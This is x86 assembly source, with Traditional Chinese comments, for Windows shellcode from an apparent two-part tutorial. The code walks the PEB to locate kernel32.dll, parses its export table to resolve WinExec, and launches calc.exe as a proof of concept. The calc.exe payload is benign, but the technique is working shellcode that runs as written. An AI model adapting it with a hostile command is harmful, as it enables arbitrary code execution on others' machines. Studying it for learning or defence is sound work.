start:
    push eax
    push ebx
    push ecx
    push edx
    push esi
    push edi
    push ebp

    push ebp
    mov ebp, esp
    sub esp, 18h

    xor esi, esi
    push esi                        ; WinExec
    push 636578h
    push 456e6957h
    mov [ebp-4], esp

    ; 1. 找到 Kernel32.dll
    ; 取得 PEB 位址
    mov ebx, [fs:30h]

    ; 取得 PEB_LDR_DATA 位址
    mov ebx, [ebx + 0x0C]

    ; 取得並訪問 InMemoryOrderModuleList 位址
    mov ebx, [ebx + 0x14]

    ; 取得 kernel32.dll 的 Base Address
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 0x10]           ; InMemoryOrderModuleList 的第三個 DLL 就是 kernel32.dll
    mov [ebp-8], ebx

    ;
    ; 以上是歡迎來到實力至上主義的 Shellcode (上) 的內容
    ; 以下是歡迎來到實力至上主義的 Shellcode (下) 的內容
    ;

    ; 2. 從 kernel32.dll 中找到 WinExec 函數
    ; 取得 NT Header 位址 
    mov eax, [ebx + 3Ch]            ; NT Header 的 RVA
    add eax, ebx                    ; NT Header = Image Base + e_lfanew

    ; 取得 Export Directory 位址
    mov eax, [eax + 78h]            ; DataDirectory 結構，成員 VirtualAddress 是 Export Directory 的 RVA
    add eax, ebx                    ; Export Directory = Image Base + Export Directory 的 RVA

    ; 取得 Address Table、Name Pointer Table、Ordinal Table
    mov ecx, [eax + 24h]            ; Ordinal Table 的 RVA
    add ecx, ebx                    ; Ordinal Table 的位址
    mov [ebp-0Ch], ecx

    mov edi, [eax + 20h]            ; Name Pointer Table 的 RVA
    add edi, ebx                    ; Name Pointer Table 的位址
    mov [ebp-10h], edi

    mov edx, [eax + 1Ch]            ; Address Table 的 RVA
    add edx, ebx                    ; Address Table 的位址
    mov [ebp-14h], edx

    mov edx, [eax + 14h]            ; Export Directory 其中一個成員 NumberOfFunctions
    xor eax, eax

    ; 迴圈尋找目標函數
    .loop:
        mov edi, [ebp-10h]          ; Name Pointer Table
        mov esi, [ebp-4]            ; 目標字串 "WinExec\x00"
        xor ecx, ecx

        cld
        mov edi, [edi + eax*4]      ; Name Table + 4 * x 是函數名稱的 RVA
        add edi, ebx                ; 取得函數名稱的位址
        add cx, 8
        repe cmpsb                  ; 比較字串是否為 WinExec
        jz start.found

        inc eax                     ; counter++
        cmp eax, edx                ; check if last function is reached
        jb start.loop               ; if not the last -> loop

        add esp, 26h      		
        jmp start.end               ; if function is not found, jump to end

    .found:
        mov ecx, [ebp-0Ch]          ; Ordinal Table
        mov edx, [ebp-14h]          ; Address Table

        mov ax, [ecx + eax*2]       ; y = Ordinal Table + 2 * x
        mov eax, [edx + eax*4]      ; WinExec 的 RVA = Address Table + 4 * y
        add eax, ebx


        ; 3. 執行 WinExec
        xor edx, edx
        push edx                    ; C:\Windows\System32\calc.exe
        push 6578652eh
        push 636c6163h
        push 5c32336dh
        push 65747379h
        push 535c7377h
        push 6f646e69h
        push 575c3a43h
        mov esi, esp

        push 10                     ; uCmdShow: SW_SHOWDEFAULT
        push esi                    ; lpCmdLine: "C:\Windows\System32\calc.exe"
        call eax                    ; WinExec("C:\Windows\System32\calc.exe", 10)

        add esp, 46h

    .end:	
        pop ebp
        pop edi
        pop esi
        pop edx
        pop ecx
        pop ebx
        pop eax
        ret
